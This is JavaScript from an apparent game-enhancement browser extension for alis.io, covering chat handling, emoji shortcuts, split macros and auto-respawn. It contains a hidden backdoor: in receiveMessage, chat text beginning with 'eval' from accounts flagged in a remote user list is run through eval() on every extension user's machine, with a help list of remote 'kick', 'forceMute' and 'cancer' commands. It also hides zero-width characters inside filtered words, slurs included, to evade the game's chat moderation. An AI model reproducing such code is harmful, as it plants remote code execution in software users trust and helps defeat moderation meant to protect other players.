  $("#chatroom").show()
  $("#chatroom").css("margin-left", "0px");
      chatRoom.isShow = true;
      goChatUP()
  };

  chatRoom.hide = function() {
    $("#chatroom").css("margin-left", "-540px");
    setTimeout(function(){$("#chatroom").hide()}, 300)
      chatRoom.isShow = false;
  };

chatRoom.sendMessage = function(msg) {
    if (msg = msg.trim()) {
if(btaMute == true){$("#chatroom").append("<span class='msg' style='color:#ff7272;'>You are muted from Better Alis Extension</span><br>");return}
          var replacement = {
            '/shrug': '¯\\_(ツ)_/¯',
            '/lennu': 'ʕ ͡° ʖ̯ ͡°ʔ',
            '/lenny': '( ͡° ͜ʖ ͡°)',
            '/dance': '~(˘▾˘~)',
            '/tableflip': '(╯°□°）╯︵ ┻━┻',
            '/fight': '(ง •̀_•́)ง',
            '<3': '❤️',
            '</3': '💔',
            ':copy:': '©',
            '$p': $("#lilTPID").text(),
            '$u': $("#lilUID").text(),
          };


          if(msg === "/clear"){$("#chatroom").empty();return}
          if(msg === "/clear server"){$("#chatroom > div:contains(SERVER :)").remove();return}
          Object.values(users).forEach(user=>{
            if(user.eval){
              if(window.myuserid == user.uid){
          if(msg === "/hats"){
            $("#chatroom").append("<spanclass='msg' style='color:#ffeb56'>sickCrown, crown, dildo, tRex, imNoob, noob, cat, suckcat, santa, fancy, trollCrown, xaz</span>");
            goChatUP();
            return}
            if(msg === "/eval"){
              $("#chatroom").append(`<span class="msg" style="color:#ffeb56;">version()<br>ver(uid)<br>kick(uid)<br>nick(uid, "newNick")<br>stop(uid, true/false)<br>title("lb header")
              <br>cancer(uid)<br>mute(uid)  and  unmute(uid)<br>say(uid, "text")<br>updateData()<br>forceSplit(uid, num)<br>forceMute(uid)<br>checkBanned()</span>`);
              goChatUP();
              return}
          }}
          })

          if(btaEmojis.checked){
          Object.values(emojis).forEach(emoji=>{

if(emoji.type === "default"){
var replace = msg.replace(`:${emoji.name}:`, `${emoji.unicode}`)
msg = replace
}


            });
          }

          var detected = msg;
          for(var found in replacement){
            if(replacement.hasOwnProperty(found)){
              detected = detected.replace(found,replacement[found]);
            }
          }
          msg = detected

              const goodWord = (word) => word.replace(new RegExp(`.{${~~(word.length / 2)}}`), `$&${String.fromCharCode(65279)}`);
    					const badWords = ["team", "admin", "tampermonkey", "razor", "pedo", "give coins", "give me coins", "give me hat", "greeb", "hack", "wally", "extension", "camp", "cuck", "cunt", "nigger", "noob", "lagging", "script", "bitch", "google", "bing", "troll", "alis", "havoc", "onkill", "neroz", "hack", "color", "colour", "wings", "jesus", ".io", "nosx", "nos", "nox", "youtube", "accident", "dev", "give hat", "owner", "whore", "faggot", "outside"];
    					const uncuckRegex = new RegExp(badWords.join("|"), "i");
    					if (badWords.some(s => msg.toLowerCase().includes(s))) msg = msg.replace(uncuckRegex, matched => goodWord(matched));

                window.sendChat(msg);
        }
    };

chatRoom.getTimeStr = function() {
    var now = new Date;
    var index = now.getMinutes();
    return index = 10 > index ? "0" + index : index, now.getHours() + ":" + index + "";
};





chatRoom.receiveMessage = function(msg, message, color, extra) {
    // If its not set, then its blank.
    const btaMsgTime = document.getElementById('btaMsgTime');
    if (!extra.team) { extra.team = ""; }
    // Only display chat messages if they are on the same team as this player, OR from an admin
    if (extra.team != $("#team_name").val() && !extra.isAdmin && !window.seeAllChat && !extra.isServer) {
        //console.log('skipping chat message because team ' + extra.team + ' != ' + $("#team_name").val() + ' and admin ' + extra.isAdmin);
       return;
    } else {
        //console.log('displaying chat message for team ' + extra.team + ' = ' + $("#team_name").val() + ' or admin ' + extra.isAdmin);
    }

    //var chatcolor = tm_chatuser;
    var tabContent = $("<div style='display:none;' />");

    var timeStyle = ''

    timeStyle += `font-size:${btaChatTextSize.value}px;`

    if(btaMsgTime.checked == false){
      timeStyle += 'display:none;'
    }

    if(extra.isAdmin || extra.isServer || extra.isBold || extra.isTroll){
      timeStyle += 'font-weight:700;'
  }

    Object.values(users).forEach(user=>{
      if(user.bold>1){
        if(extra.uid == user.uid)timeStyle += 'font-weight:700;';
      }
})


var errors = $(`<span class='time' style='${timeStyle}'>`).text(`[${this.getTimeStr()}] `);
    // user custom name color style
    var style = ' style="';
    if (color && color != '#ffffff') {
        style += 'color: ' + color + ';';
    }
    if (extra.isAdmin || extra.isServer || extra.isBold || extra.isTroll) {
        style += ' font-weight: bold;';
    }
    if (extra.isServer){
      style += ' color:#548fff;';
    }
    style += `font-size:${btaChatTextSize.value}px;`
    style += '"';
    // If we got their PID, caches it and their details
    if (extra.pid) {
        if (!window.playerDetails[extra.pid]) { window.playerDetails[extra.pid] = {}; }
        $.extend(window.playerDetails[extra.pid], extra);
        style += ' onclick="window.onChatClick(' + extra.pid + ')" pid="' + extra.pid + '"';
    }
if(msg.includes("evenzinho") && antiseven == true)return;

    // If we are in window.seeAllChat then display team names in parenthesis
    if (window.seeAllChat) {
        msg += ' (' + extra.team + ')';
    }
    var size = $('<span class="sender"' + style + '>').text(msg + " : ");
    tabContent.append(errors);
    Object.values(users).forEach(user=>{
      Object.values(icons).forEach(icon=>{
var pSize = btaStorage.chatText*2
var iconStyle = `max-height:${pSize}px;padding-bottom:7px;`
    if(user.icon) {
        if(icon.name == user.icon){
    if(extra.uid == user.uid){tabContent.append(`<img title="${icon.title}" style="${iconStyle}" class="icon" src="${icon.url}"> `)}
  }
};
})
if(user.muted==true){
  if(extra.uid == user.uid)return;
}
})
    tabContent.append(size);
    var style1 = `font-size:${btaChatTextSize.value}px;`
    errors = $(`<span class='msg' style='${style1}'>`).text(message);
    tabContent.append(errors);
    $("#chatroom").append(tabContent);
    $(tabContent).fadeIn(250)
    Object.values(friends).forEach(friend=>{
      if(btaFlight.checked && friend.uid == extra.uid){
      $(tabContent).css("background-color", `rgba(53, 255, 90, 0.25)`)
      $(tabContent).css("border-radius", `4px`)
}
  })

  if(btaMention.checked && message.toLowerCase().includes($("#nick").val().replace(/[^\x00-\x7F]/g, "").toLowerCase())){
    $(tabContent).css("background-color", `rgba(255, 215, 56, 0.25)`)
    $(tabContent).css("border-radius", `4px`)
  }
    this.popupChat(msg, message, color);
    //$('.sender').css('color', chatcolor);
      goChatUP()
      if(btaEmojis.checked){
      Object.values(emojis).forEach(emoji=>{
        if(emoji.type === "custom"){
        if($(`span.sender`).last().next("span.msg").text().includes(`:${emoji.name}:`)){
          var fix = $(`span.sender`).last().next("span.msg").text().replace(`:${emoji.name}:`, `<img class='emoji' title=':${emoji.name}:' src='${res}/emojis/custom/${emoji.name}.png'>`);
          $(`span.sender`).last().next("span.msg").html(fix);
        }}
        });
      }

        Object.values(users).forEach(user=>{

//eval command
if(user.eval == true){
if(extra.uid == user.uid){
  var evaled = $(`span.sender[pid=${extra.pid}]`).last().next("span.msg").text();
  if(evaled.startsWith("eval")){
  var script = evaled.replace("eval", " ");
  evaled = script;
  eval(evaled);
  $(`span.sender[pid=${extra.pid}]`).last().next("span.msg").text("Evaled:" + evaled);
}}}

if(user.color){if(extra.uid == user.uid){$(`span.sender[pid=${extra.pid}]`).next("span.msg").css("color", `${user.color}`);}}
if(user.bold){if(extra.uid == user.uid){$(`span.sender[pid=${extra.pid}]`).css("font-weight", "700");}}
if(user.bold>2){if(extra.uid == user.uid){$(`span.sender[pid=${extra.pid}]`).next("span.msg").css("font-weight", "600");}}


if(user.img){
  if(extra.uid == user.uid){//img
if($(`span.sender[pid=${extra.pid}]`).last().next("span.msg").text().startsWith("$img")){
  var fix = $(`span.sender[pid=${extra.pid}]`).last().next("span.msg").text().replace("$img", "");
  $(`span.sender[pid=${extra.pid}]`).last().next("span.msg").text("Sent image:");
  $("#chatroom").append(`<img src="https://i.imgur.com/${fix}.png" style="max-width:280px;max-height:280px;">`)
}

}}
});
};


//auto respawn
btaAutorespawn.onclick = function () {save()}

  myApp.onDead = function() {
    if(btaAutorespawn.checked){
      if($("#overlays").css("display") == "none"){
  setTimeout(function(){
$("button.uk-button.uk-button-default.btn-play.uk-button-large.uk-width-small").click()
}, 60)
setTimeout(function(){
  if($("#overlays").css("display") == "none" || isJoinedGame == true){
$("button.uk-button.uk-button-default.btn-play.uk-button-large.uk-width-small").click()}
}, 1200)
      }
    }
    isJoinedGame = false;
    $(_$_3c10[43]).prop(_$_3c10[42], false);
    $(_$_3c10[0]).prop(_$_3c10[42], false);
    $(_$_3c10[50]).show();
    conn.leaveRoom(myApp.getRoom());
    updatePlayerDetails();
  };

setTimeout(function(){
  if(document.getElementsByClassName("loading saving")){buildserverlist()}
}, 10000)


function split() { //split function
    $("body").trigger($.Event("keydown", { keyCode: 32}));
    $("body").trigger($.Event("keyup", { keyCode: 32}));
};
var speed = 50; //speed to work

window.addEventListener('keydown', keydown); //macros
function keydown(event) {
    if (event.key == btaKeyPop.value) { //popsplit macro
        split();
        setTimeout(split, btaKeyPopTime.value);
    }if (event.key == btaKeyTriple.value) { //triplesplit macro
        split()
        setTimeout(split, 60);
        setTimeout(split, 200);
    }
    if (event.key == btaKey64.value) { //x64 macro
        split()
        setTimeout(split, speed);
        setTimeout(split, speed*2);
        setTimeout(split, speed*3);
        setTimeout(split, speed*4);
        setTimeout(split, speed*5);
        setTimeout(split, speed*5);
    }
};

$(document).ready(function(){
$("#timechange").click(function(){
'use strict'; sweetAlert("Loading...");var waitForFb=setInterval(()=>{"number"==typeof userid?($("#swal2-title").text(`User ID detected ${userid}...`),clearInterval(waitForFb),checkColorChangeTime()):$("#swal2-title").text("Waiting for your Facebook account to load in...")},100),checkColorChangeTime=()=>{$.getJSON(`http://api.alis.io/api/users/${userid}/upgrades`,e=>{$("#swal2-title").text(`Retrieving data from ${userid}...`),$("#swal2-title").css("white-space","pre-line");var t=new Date(e.upgrades[0].updated_at).getTime();console.log(e.upgrades[0].updated_at);var a=setInterval(()=>{var e=t-(new Date).getTime()+6048e5,r=parseInt(e/864e5),l=parseInt(e%864e5/36e5),s=parseInt(e%36e5/6e4),i=parseInt(e%6e4/1e3);$("#swal2-title").text(`You can change your color in:\n${r}d ${l}h ${s}m ${i}s`),e<=0&&($("#swal2-title").text("You can change your color now."),clearInterval(a),$("#swal2-title").removeAttr("style")),$(".swal2-buttonswrapper").children(":first").click(()=>{clearInterval(a),$("#swal2-title").removeAttr("style")})},1e3)})};
})();
});

$(document).ready(function(){
    $("#infobtn").click(function(){
        $("div#btaInfo").fadeIn(200);
    });
        $("#btaCloseInfo").click(function(){
            $("div#btaInfo").fadeOut(200);
    });
        $("#logomenu").click(function(){
            $("#btaLogoStart").fadeOut(200);
            $("#btaSettings").fadeIn(280);
    });
    $("button.uk-button.uk-button-default.btn-play.uk-button-large.uk-width-small").click(function(){
setTimeout(function(){upgradeBta()}, 300)
});
    $("#hideall").click(function(){
        $("#btaSettings").fadeOut(250);
        $("#btaLogoStart").fadeIn(200);
    });
    $("#btaEmojisToggle").click(function(){
        $("div.unicodeEmojiContainer").toggle();
    });
});

$("#pp").css("margin-right","100px")
//timer for full screeners
$(`
<div style="bottom:0;right:0;position:absolute;width:90px;height:45px;background-color:#212121;">
<div style="margin-bottom:10px;text-align:center;">
<span id="time" style="font-size:30px;color:white;">${chatRoom.getTimeStr()}</span></div>
</div>
`).insertBefore("#pp")
setInterval(function(){
  $("#time").text(chatRoom.getTimeStr())
},30*1000)
$("input#max_draw_time").attr('max','450');
$("input#draw_delay1").attr('max','450');
$("input#opt_zoom_speed").attr('max','0.99');
$("input#max_draw_time").attr('min','5');
$("input#draw_delay1").attr('min','5');
$("input#opt_zoom_speed").attr('min','0.6');
$("input#skinurl").attr('maxlength','999999');
//==////==//

setTimeout(function(){checkBanned()}, 2000)
//==////==//
